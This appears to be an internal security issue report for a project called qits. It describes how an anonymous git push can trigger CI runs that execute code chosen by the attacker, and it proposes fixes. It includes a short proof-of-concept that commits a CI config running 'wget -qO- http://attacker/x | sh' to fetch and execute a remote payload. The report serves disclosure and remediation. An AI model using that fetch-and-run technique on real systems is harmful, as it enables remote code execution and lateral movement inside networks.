# CI executes repo-controlled code, triggered by an unauthenticated push

## Introduction

A trust-model gap opened by [ci-post-receive-pipeline](../epics/qits-ci/features/2026-07-26_ci-post-receive-pipeline.md)
(the [qits-ci epic](../epics/qits-ci/epic.md) MVP). Related:

- **The trigger** — the in-process git host (`service`'s `eu.wohlben.qits.githost.GitHostRoutes`),
  which is **deliberately unauthenticated** (`auth/core`'s `PublicPaths` allowlists `/git/`)
  because its callers are workspace containers that cannot hold a user token
  ([workspace containers](../epics/qits-workspaces/features/2026-07-04_workspace-containers.md)).
- **The executor** — `ci/`'s `CiDockerRunner`, which runs each step's script in a container on the
  shared network.
- **Precedent for this kind of accepted-and-tracked exposure** —
  [artifacts' global max-body-size](2026-07-19_artifacts-global-max-body-size-widens-public-ingest-dos.md).

## Observed

Before qits-ci, an anonymous push to `/git/<repoId>/git-receive-pack` could only **write a branch
ref**. It now additionally **starts a CI run**, and the pushed commit chooses both the image and the
bash script that run. So anyone who can reach the git host with a valid repo id — a workspace
container running untrusted agent/user code, anything else on `qits-net`, or any client that can
reach the port in a deployment that exposes it — can execute arbitrary code inside qits' network:

```bash
git clone http://<qits>:8080/git/<repoId> x && cd x
mkdir -p .config/qits
printf 'steps:\n  - image: alpine:3\n    script: |\n      wget -qO- http://attacker/x | sh\n' \
  > .config/qits/ci-post-receive.yml
git commit -am ci && git push origin HEAD:refs/heads/attack
```

The step container is on the same network as qits and every workspace container, so the script can
reach the other token-free surfaces (`/git/*` for any repo id it can guess or read, `/api/artifacts`,
`/api/otel`, `/mcp`) and each workspace's ports.

A second, independent path existed via the event intake itself (`POST /api/ci/events/post-receive`
is on `PublicPaths` and its token is blank by default) — **that one is fixed**: identifiers are
validated (`CiIdentifiers`) and the clone url/sha are passed to `bash` as positional arguments, so a
crafted event can no longer inject commands or traverse paths. What remains is the *legitimate* path:
a real push whose config legitimately asks for code execution.

## Suspected cause

Executing repo-committed scripts is the feature, not the bug — every CI system does it. The gap is
that qits' **push** surface was designed as anonymous-but-harmless (it only moved refs, and repo ids
are treated as capability tokens), and the CI trigger silently promoted it to a code-execution
surface without the corresponding authentication or isolation.

## Mitigations already in place

- Step containers drop privileges: `--cap-drop=ALL`, `--security-opt=no-new-privileges`, explicit
  `--memory`/`--memory-swap`/`--pids-limit`/`--cpus` caps (`qits.ci.*`), and **the docker socket is
  never mounted** — a step cannot start siblings or escape to the host daemon.
- Intake inputs are validated and never interpolated into the step script
  (`CiIdentifiers`, `CiDockerRunner.composite`).
- Run reads are **not** public: only `/api/ci/events/` is token-free, so build logs are not
  anonymously readable.
- The write surface is token-guardable (`qits.ci.token`, `X-CI-Token`).

## Suggested fix direction

Ordered by how much they close, cheapest first:

1. **Set `qits.ci.token` in every real deployment** (prod compose + docs). Blank is only defensible
   for a single-user dev box; it should probably become *required* for the `forwardauth`/`oauth`
   variants the way `-Dqits.variant` is required at package time.
2. **Isolate the step network.** Steps need exactly one thing: the git host. Give them a dedicated
   network (`qits.ci.network` already exists — point it at a `qits-ci-net` that qits joins but
   workspaces do not), which removes container→workspace and container→container lateral movement.
   Requires qits to be reachable on that network by the name in `qits.ci.container-git-url`.
3. **Authenticate the git host** — the structural fix, and the one that makes the whole "anonymous
   push" premise go away. A per-workspace push credential (the daemon already receives a dial-home
   URL that could carry one) would let `PublicPaths` drop `/git/` entirely. This is epic-sized and
   affects workspace provisioning, submodule materialization, and the daemon's auto-push.
4. **Scope CI to trusted refs** — e.g. only run for branches whose push was authenticated, or only
   for repositories where a user explicitly enabled CI, so committing a config file is not by itself
   sufficient to get execution.

Until at least (1) and (2) land, qits-ci should be treated as **safe only where every party who can
reach the git host is already trusted with code execution** — which is true of a single-user local
qits and *not* true of a shared deployment or one running untrusted agents in workspaces.
